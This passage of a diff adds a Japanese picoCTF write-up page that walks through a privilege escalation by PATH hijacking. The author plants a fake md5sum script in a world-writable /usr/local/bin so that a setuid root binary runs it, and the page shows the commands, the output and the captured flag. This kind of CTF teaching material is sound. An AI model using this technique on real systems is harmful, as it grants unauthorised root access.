+<p>今回は、md5sumのパーミッションは上書きできないようになっています。</p>
+<pre>
+ctf-player@pico-chall$ ls -al /usr/bin/md5sum
+-rwxr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
+</pre>
+<p><br /><br /></p>
+<p><code>$PATH</code> は以下のようになっており、/usr/bin/ より先に参照されるディレクトリがいくつかあります。</p>
+<pre>
+ctf-player@pico-chall$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</pre>
+<p><br /><br /></p>
+<p>ひとつひとつ見ていくと、/usr/local/bin/ のパーミッションがおかしなことに書き込み可能になっています。</p>
+<pre>
+ctf-player@pico-chall$ ls -al /usr/local/
+total 0
+drwxr-xr-x 1 root root 17 Oct  6  2021 .
+drwxr-xr-x 1 root root 19 Oct  6  2021 ..
+drwxrwxrwx 1 root root 24 Mar  6 19:42 bin
+</pre>
+<p><br /><br /></p>
+<p>ということで、/usr/local/bin/md5sum として実行ファイルを置けば、/usr/bin/md5sum の代わりに実行されます。</p>
+<p>以下のようなやり方はできなかったので、</p>
+<pre>
+$ echo "cat /root/flag.txt" >> /usr/local/bin/md5sum
+
+</pre>
+<pre>
+$ cat << EOS
+#!/bin/bash
+echo aaa > /usr/local/bin/
+EOS
+</pre>
+<p><br /><br /></p>
+<p>ヒアドキュメント ＋ tee コマンドでファイルを作ることにしました。</p>
+<p>以下を参考にさせてもらいました。</p>
+<p><a href="https://te2u.hatenablog.jp/entry/2015/07/01/224505">https://te2u.hatenablog.jp/entry/2015/07/01/224505</a></p>
+<br />
+<pre>
+ctf-player@pico-chall$ cat <<'EOT' | tee /usr/local/bin/md5sum
+> #!/bin/bash
+> cat /root/flag.txt
+> EOT
+
+
+ctf-player@pico-chall$ ls -al /usr/local/bin/
+total 24
+drwxrwxrwx 1 root       root          20 Mar 16 09:55 .
+drwxr-xr-x 1 root       root          17 Oct  6  2021 ..
+-rwsr-xr-x 1 root       root       18312 Mar  6 19:42 flaghasher
+-rw-rw-r-- 1 ctf-player ctf-player    31 Mar 16 09:55 md5sum
+
+
+ctf-player@pico-chall$ chmod 755 /usr/local/bin/md5sum
+
+ctf-player@pico-chall$ flaghasher
+Computing the MD5 hash of /root/flag.txt....
+
+picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_5547c7aa}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_5547c7aa}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2025-04-05
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/deadface_ctf_2024/">
+            <span class="next-text nav-default">Deadface CTF 2024 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2025<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+
+</body>
+</html>
